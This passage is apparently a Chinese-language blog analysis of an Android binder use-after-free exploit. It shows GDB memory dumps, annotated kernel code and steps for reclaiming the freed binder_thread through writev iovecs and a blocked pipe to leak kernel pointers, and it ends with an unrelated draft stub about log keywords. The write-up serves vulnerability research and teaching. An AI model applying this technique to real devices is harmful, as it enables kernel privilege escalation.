0x0,</span><br><span class=\"line\">        prev = 0x0</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      type = BINDER_WORK_RETURN_ERROR</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    cmd = 0x7201</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  wait = &#123;</span><br><span class=\"line\">    lock = &#123;</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        rlock = &#123;</span><br><span class=\"line\">          raw_lock = &#123;</span><br><span class=\"line\">            owner = 0x1,</span><br><span class=\"line\">            next = 0x1</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    head = &#123;</span><br><span class=\"line\">      next = 0xffff8000d3924038,</span><br><span class=\"line\">      prev = 0xffff8000d3924038</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  stats = &#123;</span><br><span class=\"line\">    br = &#123;&#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125; &lt;repeats 18 times&gt;&#125;,</span><br><span class=\"line\">    bc = &#123;&#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125; &lt;repeats 19 times&gt;&#125;,</span><br><span class=\"line\">    obj_created = &#123;&#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;&#125;,</span><br><span class=\"line\">    obj_deleted = &#123;&#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;, &#123;</span><br><span class=\"line\">        counter = 0x0</span><br><span class=\"line\">      &#125;&#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  tmp_ref = &#123;</span><br><span class=\"line\">    counter = 0x0</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  is_dead = 0x0</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">(remote) gef➤  print sizeof(*thread)</span><br><span class=\"line\">$4 = 0x188</span><br><span class=\"line\"></span><br><span class=\"line\">(remote) gef➤  print thread</span><br><span class=\"line\">$8 = (struct binder_thread *) 0xffff8000d30c5880</span><br><span class=\"line\"></span><br><span class=\"line\">(remote) gef➤  print &amp;(thread-&gt;wait)</span><br><span class=\"line\">$6 = (wait_queue_head_t *) 0xffff8000d30c5918</span><br><span class=\"line\"></span><br><span class=\"line\">(remote) gef➤  print &amp;(thread-&gt;wait-&gt;head)</span><br><span class=\"line\">$7 = (struct list_head *) 0xffff8000d30c5920</span><br><span class=\"line\"></span><br><span class=\"line\">(remote) gef➤  x/31gx thread  --&gt;小端展示，低位低地址</span><br><span class=\"line\">0xffff8000d30c5880:\t0xffff8000d63c3c80\t0x0000000000000001</span><br><span class=\"line\">0xffff8000d30c5890:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0xffff8000d30c58a0:\t0xffff8000d30c58a0\t0xffff8000d30c58a0</span><br><span class=\"line\">0xffff8000d30c58b0:\t0x0000002000000545\t0x0000000000000001</span><br><span class=\"line\">0xffff8000d30c58c0:\t0x0000000000000000\t0xffff8000d30c58c8</span><br><span class=\"line\">0xffff8000d30c58d0:\t0xffff8000d30c58c8\t0x0000000000000000</span><br><span class=\"line\">0xffff8000d30c58e0:\t0x0000000000000000\t0x0000000000000003</span><br><span class=\"line\">0xffff8000d30c58f0:\t0x0000000000007201\t0x0000000000000000</span><br><span class=\"line\">0xffff8000d30c5900:\t0x0000000000000000\t0x0000000000000003</span><br><span class=\"line\">0xffff8000d30c5910:\t0x0000000000007201\t0x0000000000010001</span><br><span class=\"line\">0xffff8000d30c5920:\t0xffff8000d3924038\t0xffff8000d3924038</span><br><span class=\"line\">0xffff8000d30c5930:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0xffff8000d30c5940:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0xffff8000d30c5950:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0xffff8000d30c5960:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0xffff8000d30c5970:\t0x0000000000000000</span><br></pre></td></tr></table></figure>\n\n<p> 哪里持有 binder_thread-&gt;wait</p>\n <figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"comment\">// fs/eventpoll.c</span></span><br><span class=\"line\">SYSCALL_DEFINE4(epoll_ctl, <span class=\"type\">int</span>, epfd, <span class=\"type\">int</span>, op, <span class=\"type\">int</span>, fd,</span><br><span class=\"line\">\t\t<span class=\"keyword\">struct</span> epoll_event __user *, event)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  \t<span class=\"keyword\">switch</span> (op) &#123;</span><br><span class=\"line\">\t  <span class=\"keyword\">case</span> EPOLL_CTL_ADD:</span><br><span class=\"line\">\t\t\terror = ep_insert(ep, &amp;epds, tf.file, fd, full_check);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">ep_insert</span><span class=\"params\">(<span class=\"keyword\">struct</span> eventpoll *ep, <span class=\"keyword\">struct</span> epoll_event *event,</span></span><br><span class=\"line\"><span class=\"params\">\t\t     <span class=\"keyword\">struct</span> file *tfile, <span class=\"type\">int</span> fd, <span class=\"type\">int</span> full_check)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  \tep_set_ffd(&amp;epi-&gt;ffd, tfile, fd);<span class=\"comment\">// poll: file</span></span><br><span class=\"line\">  \tinit_poll_funcptr(&amp;epq.pt, ep_ptable_queue_proc); <span class=\"comment\">// poll: poll_table</span></span><br><span class=\"line\"></span><br><span class=\"line\">\trevents = ep_item_poll(epi, &amp;epq.pt);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">unsigned</span> <span class=\"type\">int</span> <span class=\"title function_\">ep_item_poll</span><span class=\"params\">(<span class=\"keyword\">struct</span> epitem *epi, poll_table *pt)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tpt-&gt;_key = epi-&gt;event.events;</span><br><span class=\"line\">  <span class=\"comment\">//调用binder fd的 poll 方法</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> epi-&gt;ffd.file-&gt;f_op-&gt;poll(epi-&gt;ffd.file, pt) &amp; epi-&gt;event.events;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ----&gt; 调用到 /drivers/android/binder.c</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">unsigned</span> <span class=\"type\">int</span> <span class=\"title function_\">binder_poll</span><span class=\"params\">(<span class=\"keyword\">struct</span> file *filp,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t<span class=\"keyword\">struct</span> poll_table_struct *wait)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  \tpoll_wait(filp, &amp;thread-&gt;wait, wait);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ----&gt; 调用到 /include/linux/poll.h</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title function_\">poll_wait</span><span class=\"params\">(<span class=\"keyword\">struct</span> file * filp, <span class=\"type\">wait_queue_head_t</span> * wait_address, poll_table *p)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (p &amp;&amp; p-&gt;_qproc &amp;&amp; wait_address)</span><br><span class=\"line\">\t\tp-&gt;_qproc(filp, wait_address, p);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// ----&gt; 即回调到 /fs/eventpoll.c</span></span><br><span class=\"line\"><span class=\"comment\">//[#0] 0xffff0000082492f0 → ep_ptable_queue_proc(file=0xffff8000fae61900, whead=0xffff8000f8bb6c98, pt=0xffff00000ace3ea8)</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">ep_ptable_queue_proc</span><span class=\"params\">(<span class=\"keyword\">struct</span> file *file, <span class=\"type\">wait_queue_head_t</span> *whead,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t poll_table *pt)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">epitem</span> *<span class=\"title\">epi</span> =</span> ep_item_from_epqueue(pt);</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">eppoll_entry</span> *<span class=\"title\">pwq</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (epi-&gt;nwait &gt;= <span class=\"number\">0</span> &amp;&amp; (pwq = kmem_cache_alloc(pwq_cache, GFP_KERNEL))) &#123;</span><br><span class=\"line\">\t\tinit_waitqueue_func_entry(&amp;pwq-&gt;wait, ep_poll_callback);</span><br><span class=\"line\">\t\tpwq-&gt;whead = whead;</span><br><span class=\"line\">\t\tpwq-&gt;base = epi;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (epi-&gt;event.events &amp; EPOLLEXCLUSIVE)</span><br><span class=\"line\">\t\t\tadd_wait_queue_exclusive(whead, &amp;pwq-&gt;wait);</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t\tadd_wait_queue(whead, &amp;pwq-&gt;wait);</span><br><span class=\"line\">\t\tlist_add_tail(&amp;pwq-&gt;llink, &amp;epi-&gt;pwqlist);</span><br><span class=\"line\">\t\tepi-&gt;nwait++;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">/* We have to signal that an error occurred */</span></span><br><span class=\"line\">\t\tepi-&gt;nwait = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//把epoll的wwait_queue_entry_t 加入到以binder_thread-&gt;wait(whead)头为准的队列中，且此头指针被eppoll_entry-&gt;whead持有</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//此eppoll_entry 又通过list_add_tail(&amp;pwq-&gt;llink, &amp;epi-&gt;pwqlist); 加到了poll wait queues</span></span><br></pre></td></tr></table></figure>\n\n<p>  ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[#0] 0xffff000008840618 → binder_thread_release(proc=0xffff8000f8bbd800, thread=0xffff8000f8bb6c00)</span><br><span class=\"line\"></span><br><span class=\"line\">0xffff8000f8bb6c90:\t0x0000000000007201\t0x0000000000010001</span><br><span class=\"line\">0xffff8000f8bb6ca0:\t0xffff8000f8ed7030\t0xffff8000f8ed7030</span><br></pre></td></tr></table></figure>\n<p>制造free point</p>\n<p>binder_thread 整个被释放 0x188 字节<br>如何申请到binder_thread 释放的这块结构体的内存</p>\n<p>即利用管道的 copy from user 来覆盖binder_thread 结构体</p>\n<ol>\n<li><p>把管道容量调成一页<br>fcntl(pipefd[0], F_SETPIPE_SZ, 0x1000);<br>这样管道的最大缓冲区就只有 0x1000 字节（1 页）。</p>\n</li>\n<li><p>   第 10 个 iovec 刚好写入一页数据<br>iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0x1000;</p>\n</li>\n<li><p>   管道满了就阻塞写<br>在 writev() 执行到第 10 个 iovec，把那整页数据写进管道后，管道就“满”了。此时内核的 pipe_write() 会发现没有更多空间，于是把当前写操作挂起（阻塞）——也就是在这一行代码里阻塞，直到有读端把管道读空一点。<br>待确认问题：writev卡在哪里？，以便于EPOLL_CTL_DEL 触发<br>copy_from_user 将vec 覆盖binder_thread<br>(remote) gef➤  x/26gx 0xffff8000f88b1000<br>0xffff8000f88b1000:    0x0000000000000000    0x0000000000000000<br>0xffff8000f88b1010:    0x0000000000000000    0x0000000000000000<br>0xffff8000f88b1020:    0x0000000000000000    0x0000000000000000<br>0xffff8000f88b1030:    0x0000000000000000    0x0000000000000000<br>0xffff8000f88b1040:    0x0000000000000000    0x0000000000000000<br>0xffff8000f88b1050:    0x0000000000000000    0x0000000000000000<br>0xffff8000f88b1060:    0x0000000000000000    0x0000000000000000<br>0xffff8000f88b1070:    0x0000000000000000    0x0000000000000000<br>0xffff8000f88b1080:    0x0000000000000000    0x0000000000000000<br>0xffff8000f88b1090:    0x0000000000000000    0x0000000000000000<br>0xffff8000f88b10a0:    0x0000000100000000    0x0000000000001000<br>0xffff8000f88b10b0:    0x00000000beefdead    0x0000000000001000<br>0xffff8000f88b10c0:    0x0000000000000000    0x0000000000000000</p>\n</li>\n<li><p>writev 申请到free point指向的内存<br>writev<br>do_writev<br>vfs_readv<br>import_iovec<br>rw_copy_check_uvector</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//read_write.c</span></span><br><span class=\"line\">ret = import_iovec(WRITE, vec, vlen, ARRAY_SIZE(iovstack), &amp;iov, &amp;iter);</span><br></pre></td></tr></table></figure>\n<p>内部会调用 rw_copy_check_uvector()，当用户传入的 vlen（这里是 25）大于 UIO_FASTIOV（通常是 16）时，它就会走到这段代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//iov_iter.c import_iovec</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">import_iovec</span><span class=\"params\">(<span class=\"type\">int</span> type, <span class=\"type\">const</span> <span class=\"keyword\">struct</span> iovec __user * uvector,</span></span><br><span class=\"line\"><span class=\"params\">\t\t <span class=\"type\">unsigned</span> nr_segs, <span class=\"type\">unsigned</span> fast_segs,</span></span><br><span class=\"line\"><span class=\"params\">\t\t <span class=\"keyword\">struct</span> iovec **iov, <span class=\"keyword\">struct</span> iov_iter *i)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> n;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">iovec</span> *<span class=\"title\">p</span>;</span></span><br><span class=\"line\">\tn = rw_copy_check_uvector(type, uvector, nr_segs, fast_segs,</span><br><span class=\"line\">\t\t\t\t  *iov, &amp;p);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (n &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (p != *iov)</span><br><span class=\"line\">\t\t\tkfree(p);</span><br><span class=\"line\">\t\t*iov = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> n;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tiov_iter_init(i, type, p, nr_segs, n);</span><br><span class=\"line\">\t*iov = p == *iov ? <span class=\"literal\">NULL</span> : p;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">EXPORT_SYMBOL(import_iovec);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//read_write.c</span></span><br><span class=\"line\"><span class=\"type\">ssize_t</span> <span class=\"title function_\">rw_copy_check_uvector</span><span class=\"params\">(<span class=\"type\">int</span> type, <span class=\"type\">const</span> <span class=\"keyword\">struct</span> iovec __user * uvector,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t      <span class=\"type\">unsigned</span> <span class=\"type\">long</span> nr_segs, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> fast_segs,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t      <span class=\"keyword\">struct</span> iovec *fast_pointer,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t      <span class=\"keyword\">struct</span> iovec **ret_pointer)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (nr_segs &gt; fast_segs) &#123;</span><br><span class=\"line\">    iov = kmalloc(nr_segs*<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> iovec), GFP_KERNEL);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (iov == <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">        ret = -ENOMEM;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">[#<span class=\"number\">0</span>] <span class=\"number\">0xffff000008202734</span> → rw_copy_check_uvector(type=<span class=\"number\">0x1</span>, uvector=<span class=\"number\">0xffffc2823a60</span>, nr_segs=&lt;optimized out&gt;, fast_segs=&lt;optimized out&gt;, fast_pointer=<span class=\"number\">0xffff8000f8bb6c00</span>, ret_pointer=<span class=\"number\">0xffff00000ace3d78</span>)</span><br><span class=\"line\">$<span class=\"number\">1</span> = (<span class=\"keyword\">struct</span> iovec *) <span class=\"number\">0xffff8000f8bb6c00</span></span><br></pre></td></tr></table></figure>\n<p>也就是说，它会 kmalloc(25 * sizeof(struct iovec))，大概 400 字节，这恰好落在内核的 kmalloc-512 slab 缓存中。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting POC</span><br><span class=\"line\">[  202.793008] ztest:binder_thread_release: thread=ffff8000f88c9600 , size is 392</span><br><span class=\"line\">[  202.793412] ztest:rw_copy_check_uvector: iov=ffff8000f88c9600, size is 16</span><br></pre></td></tr></table></figure>\n<p>而之前，PoC 刚好在 binder_thread_release() 中把那个大小也是 0x190（400）字节左右的 binder_thread 对象 free 掉，那个对象所在的 slab 正好就回到了 kmalloc-512 缓存。紧接着，rw_copy_check_uvector() 的那次 kmalloc-512 正好就分配到了这块刚释放的内存，于是：</p>\n</li>\n<li><p>偷渡内核指针</p>\n</li>\n</ol>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &amp;event);</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">ep_remove</span><span class=\"params\">(<span class=\"keyword\">struct</span> eventpoll *ep, <span class=\"keyword\">struct</span> epitem *epi)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  ep_unregister_pollwait(ep, epi);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">ep_unregister_pollwait</span><span class=\"params\">(<span class=\"keyword\">struct</span> eventpoll *ep, <span class=\"keyword\">struct</span> epitem *epi)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">list_head</span> *<span class=\"title\">lsthead</span> =</span> &amp;epi-&gt;pwqlist;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">eppoll_entry</span> *<span class=\"title\">pwq</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (!list_empty(lsthead)) &#123;</span><br><span class=\"line\">    <span class=\"comment\">//...</span></span><br><span class=\"line\">\t\tep_remove_wait_queue(pwq);</span><br><span class=\"line\">\t\tkmem_cache_free(pwq_cache, pwq);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">ep_remove_wait_queue</span><span class=\"params\">(<span class=\"keyword\">struct</span> eppoll_entry *pwq)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">wait_queue_head_t</span> *whead;</span><br><span class=\"line\"></span><br><span class=\"line\">\trcu_read_lock();</span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t * If it is cleared by POLLFREE, it should be rcu-safe.</span></span><br><span class=\"line\"><span class=\"comment\">\t * If we read NULL we need a barrier paired with</span></span><br><span class=\"line\"><span class=\"comment\">\t * smp_store_release() in ep_poll_callback(), otherwise</span></span><br><span class=\"line\"><span class=\"comment\">\t * we rely on whead-&gt;lock.</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\twhead = smp_load_acquire(&amp;pwq-&gt;whead);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (whead)</span><br><span class=\"line\">\t\tremove_wait_queue(whead, &amp;pwq-&gt;wait);</span><br><span class=\"line\">\trcu_read_unlock();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<ol start=\"6\">\n<li>   Child 进程读走一页，唤醒父进程继续写<br>子进程在睡眠 2 秒后，调用 read(pipefd[0],…) 取走这一页“dummy” 数据，这时管道里腾出空间，writev() 在这句就被唤醒，继续处理后续的第 11 个 iovec（也就是指向已释放内核内存的那段），完成真正的泄露。</li>\n</ol>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">break</span> ep_ptable_queue_proc</span><br><span class=\"line\">[#<span class=\"number\">0</span>] <span class=\"number\">0xffff000008249300</span> → ep_ptable_queue_proc(file=<span class=\"number\">0xffff8000fae61100</span>, whead=<span class=\"number\">0xffff8000f8bb6e98</span>, pt=&lt;optimized out&gt;)</span><br><span class=\"line\"></span><br><span class=\"line\">(remote) gef➤  x/<span class=\"number\">20</span>gx $x20</span><br><span class=\"line\"><span class=\"number\">0xffff8000f8ed71b0</span>:\t<span class=\"number\">0xffff8000f8ef2140</span>\t<span class=\"number\">0xffff8000f8ef2140</span></span><br><span class=\"line\"><span class=\"number\">0xffff8000f8ed71c0</span>:\t<span class=\"number\">0xffff8000f8ef2100</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0xffff8000f8ed71d0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0xffff000008249c38</span></span><br><span class=\"line\"><span class=\"number\">0xffff8000f8ed71e0</span>:\t<span class=\"number\">0xffff8000f8bb6ea0</span>\t<span class=\"number\">0xffff8000f8bb6ea0</span></span><br><span class=\"line\"><span class=\"number\">0xffff8000f8ed71f0</span>:\t<span class=\"number\">0xffff8000f8bb6e98</span>\t<span class=\"number\">0xffff8000f8ed7240</span></span><br><span class=\"line\"></span><br><span class=\"line\">epi = <span class=\"number\">0xffff8000f8ef2100</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">break</span> binder_thread_release</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">break</span> rw_copy_check_uvector</span><br><span class=\"line\">[#<span class=\"number\">0</span>] <span class=\"number\">0xffff0000082025c8</span> → rw_copy_check_uvector(type=<span class=\"number\">0x1</span>, uvector=<span class=\"number\">0xffffd821a1c0</span>, nr_segs=<span class=\"number\">0x18</span>, fast_segs=<span class=\"number\">0x8</span>, fast_pointer=<span class=\"number\">0xffff00000acc3de0</span>, ret_pointer=<span class=\"number\">0xffff00000acc3d78</span>)</span><br><span class=\"line\">$<span class=\"number\">1</span> = (<span class=\"keyword\">struct</span> iovec *) <span class=\"number\">0xffff8000f8bb6e00</span></span><br><span class=\"line\"><span class=\"keyword\">break</span> ep_remove_wait_queue</span><br></pre></td></tr></table></figure>"},{"_content":"崩溃分析\nFATAL AndroidRuntime \n\nANR分析\n\n","source":"_drafts/日志关键词.md","raw":"崩溃分析\nFATAL AndroidRuntime 